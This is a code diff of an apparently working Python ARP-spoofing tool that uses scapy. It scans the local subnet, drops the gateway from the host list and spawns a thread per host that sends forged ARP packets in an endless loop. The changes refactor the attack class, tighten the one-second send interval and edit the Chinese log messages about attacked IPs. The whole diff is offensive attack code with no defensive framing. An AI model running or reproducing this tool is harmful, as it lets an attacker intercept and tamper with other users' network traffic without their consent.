@@ -74,9 +74,9 @@ def get_default_gateway():
         return default_gateway
 
 class Arp_deceive(object):
-    # def __init__(self,t_dic,g_dic):
-    #     self.t_dic = t_dic
-    #     self.g_dic = g_dic
+    def __init__(self,t_dic,g_dic):
+        self.t_dic = t_dic
+        self.g_dic = g_dic
 
     def attack(self,l_mac):
 
@@ -96,15 +96,13 @@ class Arp_deceive(object):
 
         sendp(pkt1, verbose=False)
         sendp(pkt2, verbose=False)
-        # print(f"发送欺骗数据包到 {self.t_dic['host']} mac:{target_mac} 和 {self.g_dic} mac:{gateway_mac}")
-        time.sleep(1.5)
+        print(f"id:{threading.get_ident()}发送欺骗数据包到 {self.t_dic['host']} mac:{target_mac} 和 {self.g_dic} mac:{gateway_mac}")
+        time.sleep(1)
 
 
 
-    def main(self,t_dic,g_dic,l_mac):
-        print(f"当前线程 ID: {threading.get_ident()} 攻击ip:{t_dic['host']}")
-        self.t_dic = t_dic
-        self.g_dic = g_dic
+    def main(self,l_mac):
+        print(f"当前线程 ID: {threading.get_ident()} 攻击ip:{self.t_dic['host']}")
 
         while True:
             self.attack(l_mac)
@@ -126,6 +124,10 @@ def local_mac():
         num += 1
     local_mac = input('选择本机mac:')
     return mac_list[int(local_mac)]
+
+def t_def(t_dic,g_dic,l_mac):
+    a = Arp_deceive(t_dic, g_dic)
+    a.main(l_mac)
 if __name__ == '__main__':
     while True:
         while True:
@@ -137,7 +139,7 @@ if __name__ == '__main__':
             t_ip,tg = get_segment()
             a = get_ip(tg=tg)
             h_list = a.main()
-            print(h_list)
+            # print(h_list)
             g_ip = get_default_gateway()
 
             del_glist = [  i for i in h_list if i['host'] != f'{g_ip}']
@@ -145,10 +147,10 @@ if __name__ == '__main__':
 
             print(del_glist)
             l_mac = local_mac()
-            A = Arp_deceive()
+            # A = Arp_deceive()
             threads = []
             for j in del_glist:
-                thread = threading.Thread(target=A.main,args=(j,g_ip,l_mac))
+                thread = threading.Thread(target=t_def,args=(j,g_ip,l_mac))
                 threads.append(thread)
                 thread.start()
             for i in threads:
